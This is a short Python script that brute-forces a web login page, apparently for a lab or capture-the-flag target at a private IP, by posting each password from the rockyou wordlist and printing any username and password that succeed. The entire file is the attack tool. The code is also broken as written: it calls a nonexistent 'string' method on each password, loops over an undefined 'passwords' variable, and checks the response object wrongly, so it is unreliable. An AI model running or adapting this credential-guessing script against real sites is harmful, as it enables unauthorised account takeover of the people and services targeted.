import requests
from termcolor import colored


def bruteforce(username,url):
    for password in passwords:
        password = password.string('\n')
        print(colored("Tring Password: %s" % password, "yellow"))
        data_of_the_user = {"username":username,"password":password,"Login":"submit"}
        response_from_the_server = requests.post(url,data_of_the_user)
        if b"Login failed" in response_from_the_server:
            pass

        else:
            print(colored("[+] Username: " + username ,"green"))
            print(colored("[+] Password: " + password ,"green"))
            exit()



page_url = "http://10.10.17.173/login.php" #Please change the IP address!
username = input("Please enter the username for specified Page: \n") # the user needs to specify the username


with open("/usr/share/wordlists/rockyou.txt","r"): #Your wordlist can be changed, please change it!! 
    bruteforce(username,page_url)

print(colored("[-] Sorry we could not find the password in the password list!!"))
